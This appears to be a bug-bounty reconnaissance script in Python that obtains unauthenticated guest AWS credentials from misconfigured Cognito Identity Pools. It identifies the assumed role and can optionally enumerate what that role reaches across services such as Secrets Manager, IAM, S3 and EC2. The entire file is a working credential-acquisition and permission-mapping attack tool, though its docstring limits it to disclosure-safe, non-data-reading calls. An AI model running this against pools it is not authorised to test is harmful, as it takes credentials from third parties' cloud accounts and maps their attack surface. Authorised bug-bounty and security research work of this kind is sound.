#!/usr/bin/env python3
"""
recon_cognito_test.py — SAFE unauthenticated AWS Cognito Identity Pool tester.

The money primitive behind H1 #3800848 (Logitech, Critical): an Identity Pool
configured for unauthenticated ("guest") access hands valid temporary AWS creds
to anyone. We confirm issuance the way the reference methodology does
(hackingthe.cloud / Yassine Aboukir NahamCon): GetId -> GetCredentialsForIdentity
with NO logins, unsigned (we hold no AWS creds), then sts:GetCallerIdentity to
prove which role we assumed.

SAFETY (hard line, doctrine):
  * cognito-identity + sts calls hit AWS endpoints, NOT the bug-bounty host.
  * We NEVER pass --logins / real creds; guest path only.
  * Default STOPS at the assumed-role ARN (issuance confirmed) — the exact
    Logitech responsible-disclosure boundary.
  * --assess adds a BLAST-RADIUS probe that is permission-enumeration ONLY:
    account/service-level list_/describe_ calls to learn what the role *can*
    reach (AccessDenied vs allowed). It NEVER reads object/item DATA, never
    writes, never touches money/state. This is the authorized "prove impact"
    step (turns Medium -> High/Critical) — third-party DATA is still off-limits.

Output: one JSON verdict object on stdout.
  verdict: "issued"        -> unauth creds returned (CONFIRMED primitive)
           "misconfigured" -> GetId ok but no usable role (InvalidIdentityPoolConfiguration)
           "denied"        -> pool exists but refuses unauth (secure)
           "notfound"      -> ResourceNotFoundException (bad/stale pool id)
           "error"         -> anything else (message included)
"""
import argparse, json, re, sys

try:
    import boto3
    from botocore import UNSIGNED
    from botocore.config import Config
    from botocore.exceptions import ClientError, EndpointConnectionError, BotoCoreError
except Exception as e:  # pragma: no cover
    print(json.dumps({"verdict": "error", "error": f"boto3 missing: {e}"}))
    sys.exit(0)

POOL_RE = re.compile(r'^([a-z]{2}-[a-z]+-\d):[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$')

# Blast-radius probe: SAFE, account/service-level enumeration only. Each entry is
# (service, method, kwargs). NONE read object/item data or mutate anything — they
# reveal whether the unauth role holds the permission (allowed vs AccessDenied).
SAFE_PROBES = [
    ("s3",         "list_buckets",              {}),
    ("dynamodb",   "list_tables",               {"Limit": 5}),
    ("lambda",     "list_functions",            {"MaxItems": 5}),
    ("sns",        "list_topics",               {}),
    ("sqs",        "list_queues",               {"MaxResults": 5}),
    ("secretsmanager", "list_secrets",          {"MaxResults": 5}),
    ("ssm",        "describe_parameters",       {"MaxResults": 5}),
    ("cognito-identity", "list_identity_pools", {"MaxResults": 5}),
    ("iam",        "list_roles",                {"MaxItems": 5}),
    ("ec2",        "describe_instances",        {"MaxResults": 5}),
    ("cognito-idp", "list_user_pools",          {"MaxResults": 5}),
    ("appsync",    "list_graphql_apis",         {"maxResults": 5}),
    # MobileHub/Amplify-classic unauth grants (what made Logitech's pools reachable)
    ("apigateway", "get_rest_apis",             {"limit": 5}),
    ("pinpoint",   "get_apps",                  {}),
    ("kinesis",    "list_streams",              {"Limit": 5}),
    ("firehose",   "list_delivery_streams",     {"Limit": 5}),
    ("opensearch", "list_domain_names",         {}),
    ("stepfunctions", "list_state_machines",    {"maxResults": 5}),
    ("mobiletargeting", "get_apps",             {}),
    ("cloudwatch", "describe_alarms",           {"MaxRecords": 5}),
    ("logs",       "describe_log_groups",       {"limit": 5}),
    ("es",         "list_domain_names",         {}),
]


def _short(e):
    if isinstance(e, ClientError):
        return e.response.get("Error", {}).get("Code", str(e))
    return type(e).__name__


def assess(creds, region):
    """Permission-enumeration only. Returns {allowed:[...], denied:n, detail:{...}}.
    Records COUNTS/names of resources exposed, never their contents."""
    allowed, denied, detail = [], 0, {}
    sess = boto3.session.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretKey"],
        aws_session_token=creds["SessionToken"],
        region_name=region,
    )
    for svc, method, kwargs in SAFE_PROBES:
        try:
            cli = sess.client(svc, region_name=region)
            resp = getattr(cli, method)(**kwargs)
            # summarise reach WITHOUT dumping data: just counts / top-level names
            summ = {}
            for k, v in (resp or {}).items():
                if k in ("ResponseMetadata",):
                    continue
                if isinstance(v, list):
                    summ[k] = len(v)
            allowed.append(f"{svc}:{method}")
            if summ:
                detail[f"{svc}:{method}"] = summ
        except (ClientError, BotoCoreError) as e:
            code = _short(e)
            if code in ("AccessDenied", "AccessDeniedException", "UnauthorizedOperation",
                        "AuthorizationError", "NotAuthorized", "NotAuthorizedException"):
                denied += 1
            else:
                # e.g. it *would* be allowed but service needs different call shape
                detail.setdefault("_other", {})[f"{svc}:{method}"] = code
        except Exception as e:
            detail.setdefault("_other", {})[f"{svc}:{method}"] = _short(e)
    return {"allowed": allowed, "denied": denied, "detail": detail}


def test_pool(pool, region=None, do_assess=False, timeout=15):
    m = POOL_RE.match(pool.strip())
    if not m:
        return {"pool": pool, "verdict": "error", "error": "not a valid pool id (region:uuid)"}
    region = region or m.group(1)
    cfg = Config(signature_version=UNSIGNED, connect_timeout=timeout,
                 read_timeout=timeout, retries={"max_attempts": 2})
    ci = boto3.client("cognito-identity", region_name=region, config=cfg)
    out = {"pool": pool, "region": region}
    try:
        idid = ci.get_id(IdentityPoolId=pool)["IdentityId"]
        out["identity_id"] = idid
    except ClientError as e:
        code = _short(e)
        if code == "ResourceNotFoundException":
            out["verdict"] = "notfound"
        elif code in ("NotAuthorizedException",):
            out["verdict"] = "denied"
        else:
            out["verdict"] = "error"; out["error"] = code
        return out
    except (EndpointConnectionError, BotoCoreError) as e:
        out["verdict"] = "error"; out["error"] = _short(e); return out

    # signed=False request for guest creds — no logins
    try:
        cr = ci.get_credentials_for_identity(IdentityId=idid)["Credentials"]
    except ClientError as e:
        code = _short(e)
        if code == "InvalidIdentityPoolConfigurationException":
            out["verdict"] = "misconfigured"
            out["note"] = "GetId ok but no unauth role attached (guest disabled at role level)"
        elif code in ("NotAuthorizedException",):
            out["verdict"] = "denied"
        else:
            out["verdict"] = "error"; out["error"] = code
        return out
    except (EndpointConnectionError, BotoCoreError) as e:
        out["verdict"] = "error"; out["error"] = _short(e); return out

    out["verdict"] = "issued"
    out["access_key_id"] = cr["AccessKeyId"]  # ASIA... (temp) — proof, not a persistent secret
    out["expiration"] = str(cr.get("Expiration", ""))
    # who are we?
    try:
        sts = boto3.client(
            "sts", region_name=region,
            aws_access_key_id=cr["AccessKeyId"],
            aws_secret_access_key=cr["SecretKey"],
            aws_session_token=cr["SessionToken"],
            config=Config(connect_timeout=timeout, read_timeout=timeout),
        )
        who = sts.get_caller_identity()
        out["account"] = who.get("Account")
        out["assumed_role_arn"] = who.get("Arn")
    except Exception as e:
        out["sts_error"] = _short(e)

    if do_assess:
        out["blast_radius"] = assess(cr, region)
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("pools", nargs="*", help="pool ids (region:uuid); or read from --file / stdin")
    ap.add_argument("--file", help="file of pool ids (one per line; '#host' provenance comments ok)")
    ap.add_argument("--region", help="override region (default = pool prefix)")
    ap.add_argument("--assess", action="store_true",
                    help="AUTHORIZED blast-radius: safe permission-enum on issued creds (no data reads)")
    args = ap.parse_args()

    pools = list(args.pools)
    if args.file:
        with open(args.file) as fh:
            for ln in fh:
                ln = ln.strip()
                if ln and not ln.startswith("#"):
                    pools.append(ln.split()[0])
    if not pools and not sys.stdin.isatty():
        for ln in sys.stdin:
            ln = ln.strip()
            if ln and not ln.startswith("#"):
                pools.append(ln.split()[0])

    seen = set()
    for p in pools:
        p = p.strip()
        if not p or p in seen:
            continue
        seen.add(p)
        print(json.dumps(test_pool(p, region=args.region, do_assess=args.assess)), flush=True)


if __name__ == "__main__":
    main()
